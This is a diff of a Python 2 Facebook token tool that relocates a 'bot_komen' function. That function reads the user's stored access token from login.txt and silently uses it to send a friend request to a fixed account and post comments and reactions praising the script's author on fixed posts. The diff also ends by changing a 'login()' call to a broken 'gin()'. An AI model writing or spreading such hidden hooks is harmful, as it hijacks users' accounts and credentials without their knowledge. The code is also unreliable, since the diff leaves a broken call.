@@ -195,6 +195,27 @@ while (loop == 'true'):
         print "\033[1;97mWrong Username"
         os.system('xdg-open https://m.facebook.com/khairul.fatihin557')
 
+######BOT KOMEN#######
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Token invalid"
+		os.system('rm -rf login.txt')
+	una = ('100005789553399')
+	kom = ('GUE PKE SC LU BANG WAHYU😍😍😍')
+	reac = ('ANGRY')
+	post = ('1190012567868384')
+	post2 = ('1190012567868384')
+	kom2 = ('SUKSES SELALU YA BANG WAHYU 😘😘😘')
+	reac2 = ('LOVE')
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	menu()
+
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -327,26 +348,6 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-######BOT KOMEN#######
-def bot_komen():
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;97m[!] Token invalid"
-		os.system('rm -rf login.txt')
-	una = ('100005789553399')
-	kom = ('GUE PKE SC LU BANG WAHYU😍😍😍')
-	reac = ('ANGRY')
-	post = ('1190012567868384')
-	post2 = ('1190012567868384')
-	kom2 = ('SUKSES SELALU YA BANG WAHYU 😘😘😘')
-	reac2 = ('LOVE')
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
-	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
-	menu()
 	os.system("clear") #Dev:KHAIRUL FATIHIN
 	print logo
 	print "\033[1;32m[!]\033[1;96m Logged in User Information\033[1;92m"
@@ -748,4 +749,4 @@ def pilih_super():
 
 if __name__ == '__main__':
 	login()
-login()
+gin()
